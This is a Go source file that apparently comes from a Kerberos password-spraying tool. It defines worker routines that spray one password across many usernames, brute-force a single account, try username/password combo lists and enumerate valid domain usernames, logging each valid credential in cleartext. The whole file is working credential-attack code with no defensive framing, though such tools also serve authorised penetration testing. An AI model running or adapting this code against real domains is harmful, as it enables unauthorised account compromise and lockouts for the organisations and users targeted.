package cmd

import (
	"context"
	"fmt"
	"sync"
	"sync/atomic"
)

func makeSprayWorker(ctx context.Context, usernames <-chan string, wg *sync.WaitGroup, password string, userAsPass bool, encryptionType string) {
	defer wg.Done()
	for {
		select {
		case <-ctx.Done():
			break
		case username, ok := <-usernames:
			if !ok {
				return
			}
			if userAsPass {
				testLogin(ctx, username, username, encryptionType)
			} else {
				testLogin(ctx, username, password, encryptionType)
			}
		}
	}
}

func makeBruteWorker(ctx context.Context, passwords <-chan string, wg *sync.WaitGroup, username string, encryptionType string) {
	defer wg.Done()
	for {
		select {
		case <-ctx.Done():
			break
		case password, ok := <-passwords:
			if !ok {
				return
			}
			testLogin(ctx, username, password, encryptionType)
		}
	}
}

func makeEnumWorker(ctx context.Context, usernames <-chan string, wg *sync.WaitGroup) {
	defer wg.Done()
	for {
		select {
		case <-ctx.Done():
			break
		case username, ok := <-usernames:
			if !ok {
				return
			}
			testUsername(ctx, username)
		}
	}
}

func makeBruteComboWorker(ctx context.Context, combos <-chan [2]string, wg *sync.WaitGroup, encryptionType string) {
	defer wg.Done()
	for {
		select {
		case <-ctx.Done():
			break
		case combo, ok := <-combos:
			if !ok {
				return
			}
			testLogin(ctx, combo[0], combo[1], encryptionType)
		}
	}
}

func testLogin(ctx context.Context, username string, password string, encryptionType string) {
	atomic.AddInt32(&counter, 1)
	login := fmt.Sprintf("%v@%v:%v", username, domain, password)
	if ok, err := kSession.TestLogin(username, password, encryptionType); ok {
		atomic.AddInt32(&successes, 1)
		if err != nil { // it's a valid login, but there's an error we should display
			logger.Log.Noticef("[+] VALID LOGIN WITH ERROR:\t %s\t (%s)", login, err)
		} else {
			logger.Log.Noticef("[+] VALID LOGIN:\t %s", login)
		}
		if stopOnSuccess {
			cancel()
		}
	} else {
		// This is to determine if the error is "okay" or if we should abort everything
		ok, errorString := kSession.HandleKerbError(err)
		if !ok {
			logger.Log.Errorf("[!] %v - %v", login, errorString)
			cancel()
		} else {
			logger.Log.Debugf("[!] %v - %v", login, errorString)
		}
	}
}

func testUsername(ctx context.Context, username string) {
	atomic.AddInt32(&counter, 1)
	usernamefull := fmt.Sprintf("%v@%v", username, domain)
	valid, err := kSession.TestUsername(username)
	if valid {
		atomic.AddInt32(&successes, 1)
		if err != nil {
			logger.Log.Noticef("[+] VALID USERNAME WITH ERROR:\t %s\t (%s)", username, err)
		} else {
			logger.Log.Noticef("[+] VALID USERNAME:\t %s", usernamefull)
		}

	} else if err != nil {
		// This is to determine if the error is "okay" or if we should abort everything
		ok, errorString := kSession.HandleKerbError(err)
		if !ok {
			logger.Log.Errorf("[!] %v - %v", usernamefull, errorString)
			cancel()
		} else {
			logger.Log.Debugf("[!] %v - %v", usernamefull, errorString)
		}
	} else {
		logger.Log.Debug("[!] Unknown behavior - %v", usernamefull)
	}
}
